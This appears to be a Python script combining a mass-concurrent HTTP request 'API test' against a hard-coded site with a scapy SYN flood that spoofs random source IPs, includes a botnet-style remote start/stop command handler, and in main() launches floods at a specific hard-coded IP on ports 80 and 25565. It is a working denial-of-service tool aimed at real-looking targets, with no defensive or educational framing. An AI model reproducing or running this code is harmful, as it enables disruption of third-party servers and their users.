import requests
import time
import concurrent.futures
import json

apiurl="http://skinbai0.server-station.com"
class APITest(object):

    def __init__(self):
        self.url = "http://skinbai0.server-station.com/skinlib?filter=skin&sort=time&page=1"
        self.token = ''
        self.headers = {'Content-Type': 'application/json',
                        'app_token': self.token}

        self.total_time = 0

        self.data = {

        }

    def common_get_events_list(self):
        t = time.time()
        ret = requests.get(url=self.url, headers=self.headers,
                           data=json.dumps(self.data))
        # print(ret)
        end = (time.time() - t) % 60
        return end

    def time_total(self):
        time = 12000
        with concurrent.futures.ThreadPoolExecutor(max_workers=10000000000000000000000000000000000000000000000000000000000000000
                                                   ) as executor:
            res = {executor.submit(self.common_get_events_list)
                   for i in range(time)}

            for future in concurrent.futures.as_completed(res):
                print('testing...')
                try:
                    data = future.result()
                except Exception as exc:
                    pass
                else:
                    self.total_time += data
        print('common_get_events_list:接口响应的总时间为%s秒' % str(self.total_time))
        print('common_get_events_list:平均时间为%s秒' % str(self.total_time / time))
        print('-' * 50)


'''if __name__ == '__main__':
    api = APITest()
    api.common_get_events_list()
    api.time_total()'''

import random
def randomIP():
    ip=".".join(map(str,(random.randint(0,255) for i in range(4))))
    return ip
 
#生成随机端口
def randomPort():
    port=random.randint(1000,10000)
    return port
 
#syn-flood

#Code Time

# -*- coding: utf-8 -*-
import sys

import random
import argparse

from multiprocessing import Process
from scapy.all import *
import os 
isWorking = False   
curProcess = None

# SYN flood attack
def synFlood(tgt,dPort):
    print('='*100)
    print('The syn flood is running!')
    print('='*100)
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']

    for sPort in range(1024,65535):
        index = random.randrange(4)
        ipLayer = IP(src=randomIP(), dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort,flags="S")
        packet = ipLayer / tcpLayer 
        send(packet)

# Command format '#-H xxx.xxx.xxx.xxx -p xxxx -c <start>'   
# Process command
def cmdHandle(sock,parser):
    global curProcess
    while True:
        # Receive command
        data = sock.recv(1024).decode('utf-8')
        if len(data) == 0:
            print('The data is empty')
            return
        if data[0] == '#':
            try:
                # Parse command
                options = parser.parse_args(data[1:].split())
                m_host = options.host
                m_port = options.port
                m_cmd = options.cmd
                if m_cmd.lower() == 'start':
                    if curProcess != None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                        os.system('clear')
                    print('The synFlood is start')
                    p = Process(target=synFlood,args=(m_host,m_port))
                    p.start()
                    curProcess = p
                elif m_cmd.lower() =='stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system('clear')
            except:
                print('Failed to perform the command!')

def main():
    # Add commands that need to be parsed
    p = argparse.ArgumentParser()
    p.add_argument('-H', dest='host', type=str)
    p.add_argument('-p', dest='port', type=int)
    p.add_argument('-c', dest='cmd', type=str)
    print("*" * 40)
    try:
        # Create socket object
        
        # Connect to Server


        p = Process(target=synFlood,args=('47.242.231.12',80))
        p.start()
        p = Process(target=synFlood,args=('47.242.231.12',25565))
        p.start()
        print('To connected server was success!')
        print("=" * 40)
        # Process command


    except Exception as e:
        print('The network connected failed!'+str(e))
        print('Please restart the script!')
        sys.exit(0)
def ac():
    s=APITest()
    s.common_get_events_list()
    s.time_total()
if __name__ == '__main__':
    main()

 

